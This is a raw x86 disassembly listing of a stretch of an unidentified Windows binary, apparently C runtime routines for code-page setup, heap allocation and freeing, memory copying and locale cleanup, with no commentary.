  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
